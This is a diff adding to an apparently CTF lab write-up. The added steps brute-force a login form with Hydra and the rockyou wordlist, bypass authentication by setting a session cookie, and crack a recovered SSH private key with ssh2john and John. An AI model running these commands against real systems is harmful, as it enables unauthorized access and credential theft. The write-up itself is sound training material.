@@ -29,8 +29,29 @@ nikto -host <MACHINE_IP>
 curl -X POST -F "username=admin" -F "password=passwd" http:/<MACHINE_IP>/api/login
 ```
 	
-with a failed response of <code>Incorrect credentials</code>
+with a failed response of <code>Incorrect credentials</code>, so next up we used Hydra with the following command
+	
+``` bash
+hydra -vV -l admin -P /root/Desktop/Tools/wordlists/rockyou.txt <MACHINE_IP> http-post-form "/api/login:username=^USER^&password=^PASS^:Incorrect credentials"	
+```
+Still doesn't help us even after using the names as usernames from the About Us page. So I end up looking at the <code>login.js</code> file and the <code>login()</code> function, I highlighted the important part
 
+![Capture](https://user-images.githubusercontent.com/52963102/128165302-1c3da5e3-e644-4fbc-b37f-b885b2b9bef8.PNG)
+
+After setting the cookie <code>SessionToken</code> we get a new page with an RSA private key. Save it in a file named <code>id_rsa</code> then get <code>ssh2john.py</code with:
+	
+``` bash
+wget https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/ssh2john.py	
+```
+	
+...and then run
+
+``` bash
+python3 ssh2john.py id_rsa > id_rsa.hash
+john id_rsa.hash 
+```
+
+We get <code>id_rsa:james13</code>
 
 # picoCTF
 
